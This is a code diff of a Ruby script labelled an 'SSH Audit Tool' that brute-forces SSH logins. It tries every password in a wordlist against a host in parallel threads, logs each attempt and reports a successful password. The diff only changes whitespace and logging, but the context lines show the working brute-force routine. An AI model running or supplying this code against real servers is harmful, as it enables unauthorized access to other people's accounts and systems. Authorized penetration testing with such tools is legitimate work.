@@ -48,14 +48,13 @@ def ssh_brute_force(host, port, username, password_list, logger, delay_between_a
 
   passwords = File.readlines(password_list).map(&:strip).reject(&:empty?)
   total_passwords = passwords.size
-
+  
   Parallel.each_with_index(passwords, in_threads: 5) do |password, index|
     break if $terminate
-
     progress = ((index + 1).to_f / total_passwords * 100).round(2)
     logger.info("[*] Progress: #{progress}% (#{index + 1}/#{total_passwords})")
     logger.info("[*] Trying: #{username}:#{password}")
-
+    
     begin
       Net::SSH.start(host, username, password: password, port: port, timeout: 5, non_interactive: true) do |_ssh|
         success_message = "[+] Success! Password found: #{password}"
@@ -77,26 +76,32 @@ def ssh_brute_force(host, port, username, password_list, logger, delay_between_a
       sleep(delay) unless $terminate
     end
   end
-
+  
   logger.info("[-] Password not found.") unless $terminate
   nil
 end
 
 # Main execution
-logger.info("=== SSH Audit Tool ===")
+start_message = "=== Starting SSH audit tool ==="
+puts start_message
+logger.info(start_message)
 
 # Ensure password list file exists
 unless File.exist?(password_list)
-  logger.error("[!] Password list file not found: #{password_list}")
-  puts "[!] Password list file not found: #{password_list}"
+  error_message = "[!] Password list file not found: #{password_list}"
+  logger.error(error_message)
+  puts error_message
   puts "[!] Please provide a valid password list file."
   exit(1)
 end
 
 found_password = ssh_brute_force(host, port, username, password_list, logger, delay_between_attempts)
-
 if found_password
-  logger.info("[+] Found password: #{found_password}")
+  success_message = "[+] Found password: #{found_password}"
+  logger.info(success_message)
+  puts success_message
 else
-  logger.info("[-] Brute force completed unsuccessfully.")
+  complete_message = "[-] Brute force completed unsuccessfully."
+  logger.info(complete_message)
+  puts complete_message
 end
